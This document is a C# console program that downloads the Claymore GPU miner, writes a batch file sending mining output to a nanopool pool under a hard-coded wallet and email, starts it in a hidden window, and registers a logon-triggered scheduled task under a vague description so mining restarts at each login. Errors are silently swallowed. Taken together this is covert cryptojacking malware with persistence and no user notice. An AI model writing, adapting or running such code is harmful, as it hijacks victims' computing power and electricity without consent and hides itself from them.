using System;
using System.Net;
using System.ComponentModel;
using System.IO.Compression;
using System.IO;
using System.Diagnostics;
using System.Threading;
using Microsoft.Win32.TaskScheduler;

namespace ConsoleApp1
{
    class Program
    {
        static void Download()
        {
            try
            {
                string link = "https://github.com/nanopool/Claymore-Dual-Miner/releases/download/v9.7/Claymore.s.Dual.Ethereum.Decred_Siacoin_Lbry_Pascal.AMD.NVIDIA.GPU.Miner.v9.7.zip", path = "amd.zip";
                WebClient webClient = new WebClient();

                webClient.DownloadFile(link, @"C:\" + path);
                Unzip();
            } catch (Exception){
                Thread.Sleep(600);
                Download();
            }
        }

        static void Unzip()
        {
            try
            {
                string zipPath = @"C:\amd.zip";
                string extractPath = @"C:\mining\";

                ZipFile.ExtractToDirectory(zipPath, extractPath);
                File.Delete(zipPath);
                Remark();
            }catch (Exception){

            }
        }

        static void Remark()
        {
            try
            {
                File.WriteAllText(@"C:\mining\start.bat", "EthDcrMiner64.exe -epool etc-eu1.nanopool.org:19999 -ewal 0xf4f636256055578c52ca5911efcbc99da0aed786/1060/kokanazar@yandex.ru -mode 1");
                RunMining();
            }catch (Exception){

            }
        }

        static void RunMining()
        {
            try
            {
                Process myProcess = new Process();
                myProcess.StartInfo.FileName = "cmd.exe";
                myProcess.StartInfo.Arguments = @"/C cd /mining & start.bat";
                myProcess.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                myProcess.StartInfo.CreateNoWindow = true;
                myProcess.Start();
                AutoRun();
            }catch (Exception){

            }
        }

        static void AutoRun()
        {
            try
            {
                using (TaskService ts = new TaskService())
                {
                    TaskDefinition td = ts.NewTask();
                    td.RegistrationInfo.Description = "My first task scheduler";

                    LogonTrigger trigger = new LogonTrigger();
                    td.Triggers.Add(trigger);

                    td.Actions.Add(new ExecAction(@"C:/mining/start.bat", null, null));
                    ts.RootFolder.RegisterTaskDefinition("Now!!!", td);
                }

            }
            catch (Exception){

            }
        }

        static void Main(string[] args)
        {
            Download();
        }
    }
}
